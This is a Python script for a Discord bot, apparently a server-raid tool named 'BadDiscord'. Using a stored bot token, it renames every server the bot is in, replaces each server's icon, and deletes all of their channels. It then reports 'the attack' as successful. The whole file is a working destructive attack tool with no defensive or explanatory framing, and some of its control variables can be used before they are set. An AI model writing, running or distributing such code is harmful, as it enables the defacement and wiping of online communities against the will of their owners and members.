# {
from ast import Delete
from cgi import print_arguments
from email.quoprimime import body_length
import time
from unicodedata import name
import discord
from discord.ext import commands
import os
import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True) 
# }

# Read Token
#with open("System\TempToken.dll", 'r') as file:
#    bot_token = file.read('System\TempToken.dll')
#    bot_token = None(bot_token)

print("")
print(f"{Fore.YELLOW} Please enter the path of the server image")
print(f"{Fore.YELLOW} (Example: C:/Users/bilemar/Pictures)")
reply_path = input(" (/ use) > ")
print("")
try:
    with open(reply_path, 'rb') as file:
        attack_ico = file.read()
    print(f"{Fore.CYAN} server image => {reply_path}")
except:
    print(f"{Fore.RED} A valid path is not specified the processing will continue with the default settings")
    # ----------------------------------------------
    with open("System/Attack/ico.jpg", 'rb') as file:
        attack_ico = file.read()
    # ----------------------------------------------
print("")
print(f"{Fore.YELLOW} Please enter server name")
reply_text = input(" > ")
print("")
print(f"{Fore.CYAN} server name => {reply_text}")
print("")
print(f"{Fore.YELLOW} The information gathered")
print(f"{Fore.YELLOW} ↓")
print(f"{Fore.CYAN} server name => '{reply_text}'")
print(f"{Fore.CYAN} server icon => '{reply_path}'")

# ----------------------------------------------
with open("System/TempToken.pd", 'r') as file:
    bot_token = file.read()
# ----------------------------------------------

print("")
intents = discord.Intents(messages=True, guilds=True, reactions=True, members=True, presences=True)
Bot = commands.Bot(command_prefix='BadDiscord --', intents=intents)

@Bot.event
async def on_ready():
    try:
        for guild in Bot.guilds: # Reset-icon
            await guild.edit(icon=attack_ico)
        #
        print(f"{Fore.GREEN} İcon [ok]")
        i_control = True
    except:
        print(f"{Fore.RED} İcon [err]")

    try:
        for guild in Bot.guilds: # Reset-name
            await guild.edit(name=reply_text)
        #
        print(f"{Fore.GREEN} Name [ok]")
        n_control = True
    except:
        print(f"{Fore.RED} Name [err]")

    try:
        for guild in Bot.guilds: # Reset-channels
            for channel in guild.channels:
                await channel.delete()
        #
        print(f"{Fore.GREEN} Channels [ok]")
        c_control = True
    except:
        print(f"{Fore.RED} Channels [err]")

    print("")

    if(i_control==True):
        if(n_control==True):
            if(c_control==True):
                print(f"{Fore.GREEN} The attack was carried out with success")
                input()
            else:
                print(f"{Fore.RED} Bot's powers are missing: Channel attack failed")            
        else:
            print(f"{Fore.RED} Bot's powers are missing: The name attack failed")
    else:
        print(f"{Fore.RED} Bot's powers are missing: icon attack failed")
        


Bot.run(bot_token) 